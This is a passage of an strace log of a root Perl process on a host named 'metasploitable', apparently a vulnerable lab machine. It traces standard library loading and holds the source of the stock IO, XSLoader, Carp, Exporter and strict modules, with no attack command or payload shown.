\4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
7444  07:18:47.716622 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
7444  07:18:47.716639 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e0b000
7444  07:18:47.716649 mmap2(0xb7e14000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7e14000
7444  07:18:47.716663 mmap2(0xb7e16000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7e16000
7444  07:18:47.716676 close(1)          = 0
7444  07:18:47.716698 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e0a000
7444  07:18:47.716711 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e0a8c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
7444  07:18:47.716802 mprotect(0xb7f86000, 4096, PROT_READ) = 0
7444  07:18:47.716865 munmap(0xb7fce000, 29913) = 0
7444  07:18:47.716877 set_tid_address(0xb7e0a908) = 7444
7444  07:18:47.716886 set_robust_list(0xb7e0a910, 0xc) = 0
7444  07:18:47.716895 futex(0xbff5dc00, 0x81 /* FUTEX_??? */, 1) = 0
7444  07:18:47.716909 rt_sigaction(SIGRTMIN, {0xb7f902c0, [], SA_SIGINFO}, NULL, 8) = 0
7444  07:18:47.716922 rt_sigaction(SIGRT_1, {0xb7f90340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
7444  07:18:47.716934 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
7444  07:18:47.716948 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
7444  07:18:47.716966 uname({sys="Linux", node="metasploitable", ...}) = 0
7444  07:18:47.717010 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
7444  07:18:47.717055 brk(0)            = 0x8153000
7444  07:18:47.717065 brk(0x8174000)    = 0x8174000
7444  07:18:47.717107 getuid32()        = 0
7444  07:18:47.717116 geteuid32()       = 0
7444  07:18:47.717125 getgid32()        = 0
7444  07:18:47.717134 getegid32()       = 0
7444  07:18:47.717170 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7de9000
7444  07:18:47.717196 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
7444  07:18:47.717212 read(1, "\233m\n\322", 4) = 4
7444  07:18:47.717225 close(1)          = 0
7444  07:18:47.717243 time(NULL)        = 1495624727
7444  07:18:47.717433 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbff5d8d0) = -1 ENOENT (No such file or directory)
7444  07:18:47.717469 stat64("/usr/local/lib/site_perl/5.8.8", 0xbff5d8d0) = -1 ENOENT (No such file or directory)
7444  07:18:47.717495 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbff5d8d0) = -1 ENOENT (No such file or directory)
7444  07:18:47.717510 stat64("/usr/local/lib/perl/5.8.7", 0xbff5da10) = -1 ENOENT (No such file or directory)
7444  07:18:47.717522 stat64("/usr/local/share/perl/5.8.7", 0xbff5da10) = -1 ENOENT (No such file or directory)
7444  07:18:47.717534 stat64("/usr/local/lib/perl/5.8.6", 0xbff5da10) = -1 ENOENT (No such file or directory)
7444  07:18:47.717549 stat64("/usr/local/share/perl/5.8.6", 0xbff5da10) = -1 ENOENT (No such file or directory)
7444  07:18:47.717560 stat64("/usr/local/lib/perl/5.8.4", 0xbff5da10) = -1 ENOENT (No such file or directory)
7444  07:18:47.717572 stat64("/usr/local/share/perl/5.8.4", 0xbff5da10) = -1 ENOENT (No such file or directory)
7444  07:18:47.717583 stat64("/usr/local/lib/perl/5.8.3", 0xbff5da10) = -1 ENOENT (No such file or directory)
7444  07:18:47.717594 stat64("/usr/local/share/perl/5.8.3", 0xbff5da10) = -1 ENOENT (No such file or directory)
7444  07:18:47.717605 stat64("/usr/local/lib/perl/5.8.2", 0xbff5da10) = -1 ENOENT (No such file or directory)
7444  07:18:47.717617 stat64("/usr/local/share/perl/5.8.2", 0xbff5da10) = -1 ENOENT (No such file or directory)
7444  07:18:47.717628 stat64("/usr/local/lib/perl/5.8.1", 0xbff5da10) = -1 ENOENT (No such file or directory)
7444  07:18:47.717639 stat64("/usr/local/share/perl/5.8.1", 0xbff5da10) = -1 ENOENT (No such file or directory)
7444  07:18:47.717650 stat64("/usr/local/lib/perl/5.8.0", 0xbff5da10) = -1 ENOENT (No such file or directory)
7444  07:18:47.717661 stat64("/usr/local/share/perl/5.8.0", 0xbff5da10) = -1 ENOENT (No such file or directory)
7444  07:18:47.717683 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5d708) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.717696 _llseek(0, 0, [0], SEEK_CUR) = 0
7444  07:18:47.717707 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5d708) = -1 EBADF (Bad file descriptor)
7444  07:18:47.717718 _llseek(1, 0, 0xbff5d750, SEEK_CUR) = -1 EBADF (Bad file descriptor)
7444  07:18:47.717728 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5d708) = -1 EINVAL (Invalid argument)
7444  07:18:47.717738 _llseek(2, 0, 0xbff5d750, SEEK_CUR) = -1 ESPIPE (Illegal seek)
7444  07:18:47.717748 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
7444  07:18:47.717761 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5d7c8) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.717771 _llseek(1, 0, [0], SEEK_CUR) = 0
7444  07:18:47.717782 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
7444  07:18:47.717793 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
7444  07:18:47.717810 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
7444  07:18:47.717935 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
7444  07:18:47.725126 getppid()         = 7442
7444  07:18:47.725126 stat64("/etc/perl/IO.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.725127 stat64("/etc/perl/IO.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.725127 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.725127 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.725127 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.725127 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.725128 stat64("/usr/lib/perl5/IO.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.725128 stat64("/usr/lib/perl5/IO.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.725133 stat64("/usr/share/perl5/IO.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.725145 stat64("/usr/share/perl5/IO.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.725157 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.725170 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
7444  07:18:47.725191 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
7444  07:18:47.725206 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5d1d8) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.725219 _llseek(6, 0, [0], SEEK_CUR) = 0
7444  07:18:47.725246 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
7444  07:18:47.725360 stat64("/etc/perl/XSLoader.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.725374 stat64("/etc/perl/XSLoader.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.725387 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.725400 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.725413 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.725426 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.725440 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.725451 stat64("/usr/lib/perl5/XSLoader.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.725464 stat64("/usr/share/perl5/XSLoader.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.725476 stat64("/usr/share/perl5/XSLoader.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.725489 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.725515 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
7444  07:18:47.725536 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
7444  07:18:47.725550 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5cd28) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.725561 _llseek(8, 0, [0], SEEK_CUR) = 0
7444  07:18:47.725579 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
7444  07:18:47.725827 brk(0x8195000)    = 0x8195000
7444  07:18:47.726135 _llseek(8, 3407, [3407], SEEK_SET) = 0
7444  07:18:47.726152 _llseek(8, 0, [3407], SEEK_CUR) = 0
7444  07:18:47.726163 close(8)          = 0
7444  07:18:47.726209 stat64("/etc/perl/Carp.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.726224 stat64("/etc/perl/Carp.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.726238 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.726251 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.726277 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.726290 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.726304 stat64("/usr/lib/perl5/Carp.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.726315 stat64("/usr/lib/perl5/Carp.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.726328 stat64("/usr/share/perl5/Carp.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.726340 stat64("/usr/share/perl5/Carp.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.726353 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.726366 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.726380 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.726393 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
7444  07:18:47.726414 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
7444  07:18:47.726428 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5cd28) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.726440 _llseek(8, 0, [0], SEEK_CUR) = 0
7444  07:18:47.726457 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
7444  07:18:47.726944 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
7444  07:18:47.726973 read(8, "", 4096) = 0
7444  07:18:47.726985 close(8)          = 0
7444  07:18:47.727006 stat64("/etc/perl/Exporter.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.727020 stat64("/etc/perl/Exporter.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.727038 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.727051 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.727065 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.727078 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.727092 stat64("/usr/lib/perl5/Exporter.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.727104 stat64("/usr/lib/perl5/Exporter.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.727117 stat64("/usr/share/perl5/Exporter.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.727130 stat64("/usr/share/perl5/Exporter.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.727143 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.727156 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.727169 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.727182 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
7444  07:18:47.727203 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
7444  07:18:47.727218 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5cd28) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.727229 _llseek(8, 0, [0], SEEK_CUR) = 0
7444  07:18:47.727246 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
7444  07:18:47.727706 _llseek(8, 2217, [2217], SEEK_SET) = 0
7444  07:18:47.727723 _llseek(8, 0, [2217], SEEK_CUR) = 0
7444  07:18:47.727734 close(8)          = 0
7444  07:18:47.727971 stat64("/etc/perl/strict.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.727989 stat64("/etc/perl/strict.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.728003 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.728016 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.728030 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.728043 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.728057 stat64("/usr/lib/perl5/strict.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.728068 stat64("/usr/lib/perl5/strict.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.728082 stat64("/usr/share/perl5/strict.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.728094 stat64("/usr/share/perl5/strict.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.728107 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.728119 stat64("/usr/lib/perl/5.8/strict.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.728133 stat64("/usr/share/perl/5.8/strict.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.728145 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
7444  07:18:47.728166 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
7444  07:18:47.728181 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5cd28) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.728193 _llseek(8, 0, [0], SEEK_CUR) = 0
7444  07:18:47.728212 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
7444  07:18:47.728367 _llseek(8, 598, [598], SEEK_SET) = 0
7444  07:18:47.728383 _llseek(8, 0, [598], SEEK_CUR) = 0
7444  07:18:47.728393 close(8)          = 0
7444  07:18:47.728432 stat64("/etc/perl/warnings.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.728446 stat64("/etc/perl/warnings.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.728460 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.728473 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
